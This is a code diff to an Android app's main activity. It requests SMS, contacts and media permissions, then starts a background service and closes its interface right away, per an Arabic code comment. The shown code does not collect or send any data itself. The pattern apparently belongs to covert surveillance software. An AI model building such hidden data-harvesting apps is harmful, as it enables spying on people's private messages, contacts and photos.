@@ -3,6 +3,7 @@ package com.vipih;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 
@@ -16,13 +17,29 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        Intent intent = new Intent(this, BackgroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent);
+        if (checkPermissions()) {
+            startServiceNow();
         } else {
-            startService(intent);
+            requestPerms();
         }
+    }
 
+    private boolean checkPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return false;
+            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return false;
+            
+            if (Build.VERSION.SDK_INT >= 33) {
+                if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) return false;
+                if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) return false;
+            } else {
+                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) return false;
+            }
+        }
+        return true;
+    }
+
+    private void requestPerms() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             List<String> perms = new ArrayList<>();
             perms.add(Manifest.permission.READ_SMS);
@@ -34,16 +51,26 @@ public class MainActivity extends Activity {
             } else {
                 perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
             }
-            
             requestPermissions(perms.toArray(new String[0]), PERMISSION_CODE);
         } else {
-            finish();
+            startServiceNow();
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        finish();
+        // تشغيل الخدمة فور الموافقة على الصلاحيات
+        startServiceNow();
+    }
+
+    private void startServiceNow() {
+        Intent intent = new Intent(this, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
+        finish(); // إغلاق الواجهة
     }
 }
